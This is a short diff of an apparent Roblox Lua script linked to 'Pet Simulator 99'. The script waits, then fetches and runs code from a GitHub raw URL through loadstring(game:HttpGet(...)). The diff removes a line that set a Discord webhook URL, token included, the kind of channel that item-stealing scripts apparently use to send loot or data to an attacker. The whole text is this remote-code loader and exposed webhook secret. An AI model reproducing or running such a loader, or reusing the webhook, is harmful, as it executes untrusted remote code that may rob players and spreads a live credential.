@@ -1,6 +1,5 @@
 task.wait(15)
 local success, err = pcall(function()
-    getgenv().Webhook = {"https://discord.com/api/webhooks/1327040372983205959/0LP8YgJCU9x7WBwoEHWJ2L_E8RZfJ7TzHeoZa6oDPGp-Yx4hwYVt9sLcCBRL2eLEFlzm"}
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/TOOL-PLAZA-SUU"))()
 end)
 task.wait(30)
